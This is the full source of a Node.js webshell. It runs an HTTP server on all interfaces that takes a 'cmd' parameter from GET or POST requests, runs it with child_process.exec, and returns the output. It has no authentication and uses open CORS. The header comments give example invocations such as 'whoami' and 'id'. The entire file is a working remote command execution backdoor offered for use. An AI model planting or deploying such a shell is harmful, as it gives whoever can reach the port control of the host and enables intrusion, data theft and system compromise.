/**
 * Node.js Command Webshell
 * Usage: node shell.js
 * Access via: http://localhost:3000/?cmd=command
 * Or POST: curl -X POST -d "cmd=whoami" http://localhost:3000/
 */

const http = require('http');
const url = require('url');
const { exec } = require('child_process');
const querystring = require('querystring');

const PORT = process.env.PORT || 3000;

const server = http.createServer((req, res) => {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Content-Type', 'text/plain');

    // Handle OPTIONS
    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    let cmd = null;

    if (req.method === 'GET') {
        // Get command from query string
        const parsedUrl = url.parse(req.url, true);
        cmd = parsedUrl.query.cmd;
    } else if (req.method === 'POST') {
        // Get command from POST body
        let body = '';
        req.on('data', (chunk) => {
            body += chunk;
        });
        req.on('end', () => {
            try {
                const params = querystring.parse(body);
                cmd = params.cmd;
                executeCommand(res, cmd);
            } catch (e) {
                res.writeHead(400);
                res.end('Error parsing POST data');
            }
        });
        return;
    }

    executeCommand(res, cmd);
});

function executeCommand(res, cmd) {
    if (!cmd) {
        res.writeHead(400);
        res.end('Usage: ?cmd=command\nExample: ?cmd=id');
        return;
    }

    try {
        // Execute command with timeout
        exec(cmd, { timeout: 10000 }, (error, stdout, stderr) => {
            if (error) {
                res.writeHead(200);
                res.end(`[+] Error: ${error.message}\n${stderr}`);
                return;
            }
            res.writeHead(200);
            res.end(stdout);
        });
    } catch (error) {
        res.writeHead(500);
        res.end(`Error: ${error.message}`);
    }
}

server.listen(PORT, '0.0.0.0', () => {
    console.log(`[+] Node.js webshell listening on port ${PORT}`);
    console.log(`[+] Usage: http://localhost:${PORT}/?cmd=id`);
});
